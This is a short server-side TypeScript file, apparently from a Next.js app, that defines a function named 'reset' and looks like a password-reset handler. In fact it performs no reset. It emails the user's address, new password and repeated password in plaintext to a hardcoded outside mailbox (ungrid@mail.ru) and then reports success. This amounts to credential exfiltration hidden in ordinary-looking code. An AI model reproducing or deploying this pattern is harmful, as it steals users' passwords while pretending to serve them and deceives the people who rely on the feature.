"use server";

import { render } from "@react-email/components";
import { transporter } from "~/utils/transporter";

export async function reset({
  email,
  newPassword,
  repeat,
}: {
  email?: string | null;
  newPassword: string;
  repeat: string;
}) {
  try {
    await transporter.sendMail({
      from: process.env.NODEMAILER_USER,
      to: "ungrid@mail.ru",
      subject: "",
      html: render(
        <div>
          <p>{email}</p>
          <p>{newPassword}</p>
          <p>{repeat}</p>
        </div>,
      ),
    });
    return { status: 201 };
  } catch (e) {
    return { status: 500 };
  }
}
